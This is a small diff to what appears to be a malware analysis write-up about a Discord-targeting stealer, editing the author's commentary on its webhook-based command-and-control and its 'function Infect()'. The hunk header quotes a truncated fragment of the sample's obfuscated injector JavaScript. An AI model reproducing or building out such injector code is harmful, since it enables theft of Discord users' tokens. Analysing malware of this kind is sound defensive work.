@@ -81,7 +81,7 @@ discords=[],injectPath=[],runningDiscords=[];fs[_0x2aae38(0x293)+'c'](LOCAL)[_0x
 
 >a lot of discord malware freaks use a discord webhook as a c2, which is pretty funny.
 
-well, that's obfuscated. what's even funnier is the `function Infect()`... good one.
+well, that's obfuscated.`function Infect()` isn't, though... good one.
 
 let's look at the other files before trying anything else here.
 
